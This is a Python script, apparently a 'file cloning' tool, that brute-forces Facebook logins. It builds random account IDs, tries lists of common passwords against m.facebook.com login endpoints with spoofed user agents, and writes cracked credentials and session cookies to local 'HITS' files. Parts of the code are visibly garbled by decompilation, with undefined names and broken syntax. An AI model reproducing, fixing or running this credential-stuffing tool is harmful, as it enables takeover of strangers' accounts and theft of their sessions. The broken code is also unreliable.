

###---------------### MODULES ###--------------- ###


import os, time, base64, datetime, json, sys, re, threading, uuid, string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

os.system("pip uninstall PySintx -y")
os.system("pip uninstall PyBookScrapper -y")
os.system("pip uninstall PyBookAgents -y")

try:
    import PySintx
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PySintx.git")
    import PySintx
from PySintx import *

'''
I'm using PySintx for my text color and modules dependencies like rich, random, and requests.
'''

try:
    import PyBookAgents
except ModuleNotFoundError:
    os.sytem("pip3 install git+https://github.com/sintxcs/PyBookAgents.git")
    import PyBookAgents

'''
I'm using PyBookAgents for user-agent generator
Check documentaion here: https://github.com/sintxcs/PyBookAgents
'''

try:
    import PyBookScrapper
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PyBookScrapper.git")
    import PyBookScrapper

# I'm using PyBookScrapper for scrapping of the following:
from PyBookScrapper import Scrape_Year

'''
Check documentaion here: https://github.com/sintxcs/PyBookScrapper
'''

###---------------### VARIABLES ###--------------- ###


_F = "/sdcard/SINTX/"
_D = "clear"
_B = "\n"
_A = "bold white"

try:
    os.makedirs(_F)
except:
    pass
sntxfldr = _F

cmd(_D)


###---------------### DATE TIME CHECKER ###--------------- ###


script_status = "FREE"
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)


###---------------### LOGO ###--------------- ###


lxgos = "\n\n                d8,                               \n               `8P              d8P               \n                             d888888P             \n       .d888b,  88b  88bd88b   ?88'  ?88,  88P    \n       ?8b,     88P  88P' ?8b  88P    `?8bd8P'    \n         `?8b  d88  d88   88P  88b    d8P?8b,     \n      `?888P' d88' d88'   88b  `?8b  d8P' `?8b    \n                                            \n                                            \n                                            \n"
sinInfo = "[white][›] PRESS [bold yellow]CTRL AND Z[bold white] TO STOP THE PROGRAM\n\n[white][-] FACEBOOK : SINTXCS\n[-] GITHUB   : SINTXCS"


def sintx_logo():
    cmd(_D)
    prnt(pnl(lxgos, title=f"{script_status}", subtitle="SHEESHHH !"))
    prnt(pnl(sinInfo, width=90, style=_A))


###---------------### MENU ###--------------- ###


def sintx_menu():
    B = "[sky_blue1][1] FILE CLONING\n[0] REPORT ERROR"
    sintx_logo()
    prnt(pnl(B, width=90, style=_A, title="OPTIONS"))
    A = input(f"{green}  [?] OPTION:{dark_gray} ")
    if A == "1":
        ク克隆()
    if A == "0":
        cmd("xdg-open https://m.me/61553865513324")
        sintx_menu()
    else:
        アニメ(f"{ro}  [!] INVALID INPUT")
        sintx_menu()


###---------------### FILE CLONING ###--------------- ###


loop = 0
oks = []
cps = []
twf = []
ugen = []


def pak():
    user = []
    clear()
    print('\x1b[m Put Your Own Country code')
    code = input('\x1b[1;37m put code: ')
    limit = int(input('\x1b[m example: 2000, 3000, 5000, 10000\n\x1b[1;37m put limit: '))
    if ValueError:
        limit = 5000
    clear()
    print('\x1b[1;32m [1] \x1b[mStart\t ')
    linex()
    mthd = input(' \x1b[1;97mChoose: ')
    clear()
    print('\x1b[1;32m [1] \x1b[mPH Cloning \n\x1b[1;32m [2] \x1b[mPH Cloning \n\x1b[1;32m [3] \x1b[mPH  Cloning \x1b[1;32m \n [4] \x1b[mPH Cloning \n\x1b[1;32m ')
    linex()
    pcs = input(' \x1b[1;97m[?] Select: ')
    for nmbr in range(limit):
        num = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        user.append(nmp)
        Hamza = tred(max_workers = 30)
        linex()
        clear()
        tl = str(len(user))
        print(' \x1b[1;97mTotal ids : \x1b[1;32m' + tl + ' ')
        print('\x1b[1;37m Choice code  :\x1b[m ' + code)
        linex()
        for psx in user:
            ids = code + psx
            if pcs in ('1', '01'):
                passlist = [
                    psx,
                    ids,
                    'pogiako123',
                    'ganda123',
                    'pogiko',
                    '',
                    'gandako',
                    'pogi12345',
                    'ganda12345',
                    'ganda143',
                    'pogi143',
                    'iloveyou',
                    '',
                    'i love you',
                    'magandaako']
            if pcs in ('2', '02'):
                passlist = [
                    psx,
                    ids,
                    'pogiako123',
                    'ganda123',
                    'pogiko',
                    '',
                    'gandako',
                    'pogi12345',
                    'ganda12345',
                    'ganda143',
                    'pogi143',
                    'iloveyou',
                    '',
                    'i love you',
                    'magandaako']
            if pcs in ('3', '03'):
                passlist = [
                    psx,
                    ids,
                    'pogiako123',
                    'ganda123',
                    'pogiko',
                    '',
                    'gandako',
                    'pogi12345',
                    'ganda12345',
                    'ganda143',
                    'pogi143',
                    'iloveyou',
                    '',
                    'i love you',
                    'magandaako']
            if pcs in ('4', '04'):
                passlist = [
                    psx,
                    ids,
                    '57575751',
                    '57273200',
                    'i love you',
                    'iloveyou',
                    '59039200',
                    '708090']
            if pcs in ('5', '05'):
                passlist = [
                    psx,
                    ids,
                    'pogiako123',
                    'ganda123',
                    'pogiko',
                    '',
                    'gandako',
                    'pogi12345',
                    'ganda12345',
                    'ganda143',
                    'pogi143',
                    'iloveyou',
                    '',
                    'i love you',
                    'magandaako']
            if mthd in ('1', '01'):
                Hamza.submit(Hamza1, ids, passlist)
            if mthd in ('2', '02'):
                Hamza.submit(Hamza2, ids, passlist)
            if mthd in ('3', '03'):
                Hamza.submit(Hamza3, ids, passlist)
            if mthd in ('4', '04'):
                Hamza.submit(Hamza4, ids, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
    linex()
    input(' Press enter to back ')
    os.system('python Hamza.py')
    
###---------------### API (MBASIC) ###--------------- ###


def sinsAPI_(uid, names, pxss_, tot4l):
    F = names
    A = uid
    global loop, oks, cps
    sys.stdout.write(
        f"\r\r{dark_gray}  [SINTX] %s/%s - OKS: %s - CPS: %s\r "
        % (loop, tot4l, len(oks), len(cps))
    )
    sys.stdout.flush()
    C = requests.Session()
    try:
        G = F.split(" ")[0]
        try:
            D = F.split(" ")[1]
        except:
            D = "143"
        L = G.lower()
        M = D.lower()
        for N in pxss_:
            B = (
                N.replace("First", G)
                .replace("Last", D)
                .replace("first", L)
                .replace("last", M)
            )
            header = {
                "authority": "m.facebook.com",
                "method": "GET",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=1",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": "https://m.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "Android",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": str(PyBookAgents.random_ugen()),
            }
            I = C.get(
                f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
            )
            S = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(I.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(I.text)).group(
                    1
                ),
                "uid": A,
                "next": "https://mbasic.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": B,
            }
            C.post(
                "https://m.facebook.com/login/device-based/validate-password/?shbl=0",
                data=S,
                allow_redirects=False,
                headers=header,
            ).text
            J = C.cookies.get_dict().keys()
            if "c_user" in J:
                K = ";".join(
                    ["%s=%s" % (A, B) for (A, B) in C.cookies.get_dict().items()]
                )
                open(sntxfldr + f"HITS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B + K + "\n\n"
                )
                print(_B)
                T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(
                    T, width=90, style="bold pale_turquoise1", title="SINTX SUCCESSFUL"
                )
                prnt(E)
                oks.append(A)
                break
            elif "checkpoint" in J:
                cps.append(A)
                print(_B)
                U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(U, width=90, style="bold red", title="SINTX CHECKPOINT")
                prnt(E)
                open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B
                )
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)


###---------------### START ###--------------- ###


if __name__ == "__main__":
    try:
        sintx_menu()
    except Exception as e:
        exit()
